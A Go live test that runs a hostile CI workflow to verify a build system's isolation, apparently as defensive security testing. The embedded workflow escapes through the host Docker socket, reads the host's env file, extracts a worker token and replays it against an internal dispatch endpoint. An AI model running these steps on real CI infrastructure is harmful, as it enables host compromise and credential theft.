package live

import (
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"
)

// TestCIBreakout plays a hostile workflow on a real CI instance
// (2026-11-14 isolation). Job containers get the host's Docker socket, so a
// job can read anything on the machine — the machine must therefore hold
// nothing beyond its own repo: no dispatch secret, no cloud key. The
// metadata service (which serves the user-data) must be unreachable, and the
// worker token a job can steal must not hand out any further work. The
// workflow prints only counts and status codes, never a secret.
func TestCIBreakout(t *testing.T) {
	requireLive(t)
	token, proj, repo := setupProjectRepo(t, "breakout")
	const wf = ".github/workflows/breakout.yml"
	pushBranch(t, token, proj, repo, "main", wf, `on: [workflow_dispatch]
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: metadata service
        run: |
          if curl -s -m 5 -o /dev/null http://169.254.42.42/conf; then echo "probe:metadata=reachable"; else echo "probe:metadata=blocked"; fi
      - name: read the host through the docker socket
        run: |
          curl -fsSL https://download.docker.com/linux/static/stable/x86_64/docker-27.3.1.tgz | tar -xz -C /tmp
          D=/tmp/docker/docker
          $D run --rm -v /etc:/host:ro alpine:3.20 sh -c 'f=/host/quill-ci.env; echo "probe:envfile=$(test -f $f && echo present || echo absent)"; echo "probe:dispatch_secret=$(grep -c QUILL_PIPELINE_DISPATCH_SECRET $f)"; echo "probe:scw_key=$(grep -c SCW_SECRET_KEY $f)"; echo "probe:worker_token=$(grep -c QUILL_CIW_TOKEN $f)"'
          TOKEN=$($D run --rm -v /etc:/host:ro alpine:3.20 sed -n 's/^QUILL_CIW_TOKEN=//p' /host/quill-ci.env)
          API=$($D run --rm -v /etc:/host:ro alpine:3.20 sed -n 's/^QUILL_API_URL=//p' /host/quill-ci.env)
          code=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{}' "$API/api/v1/internal/dispatch/claim")
          echo "probe:stolen_token_claim=$code"
`)
	rp := "/projects/" + proj + "/repos/" + repo + "/pipelines"
	st, b := apiCall(t, token, http.MethodPost, rp, map[string]any{"workflow": wf, "ref": "main"})
	if st != 200 && st != 201 {
		t.Fatalf("trigger: %d %s", st, b)
	}
	num := 0
	if r, ok := jbody(t, b)["run"].(map[string]any); ok {
		if f, ok := r["runNumber"].(float64); ok {
			num = int(f)
		}
	}
	start := time.Now()
	status := ""
	for time.Since(start) < 15*time.Minute {
		st, b = apiCall(t, token, http.MethodGet, fmt.Sprintf("%s/runs/%d?workflow=%s", rp, num, wf), nil)
		if st == 200 {
			run := jbody(t, b)
			if inner, ok := run["run"].(map[string]any); ok {
				run = inner
			}
			if s, _ := run["status"].(string); s != status {
				status = s
				t.Logf("run %d status=%s after %s", num, s, time.Since(start).Round(time.Second))
			}
			if status == "success" || status == "failure" || status == "cancelled" {
				break
			}
		}
		time.Sleep(10 * time.Second)
	}
	_, logs := apiCall(t, token, http.MethodGet, fmt.Sprintf("%s/runs/%d/logs?workflow=%s", rp, num, wf), nil)
	probes := map[string]string{}
	for _, line := range strings.Split(string(logs), "\\n") {
		if i := strings.Index(line, "probe:"); i >= 0 {
			if k, v, ok := strings.Cut(strings.TrimSpace(line[i+len("probe:"):]), "="); ok {
				probes[k] = strings.Trim(v, `"\`)
			}
		}
	}
	t.Logf("probes: %v (run %s)", probes, status)
	want := map[string]string{
		"metadata":           "blocked",
		"envfile":            "present", // the socket does give root on the box
		"dispatch_secret":    "0",
		"scw_key":            "0",
		"worker_token":       "1",
		"stolen_token_claim": "204", // nothing beyond its own (now claimed) scope
	}
	for k, v := range want {
		if probes[k] != v {
			t.Errorf("probe %s = %q, want %q", k, probes[k], v)
		}
	}
}
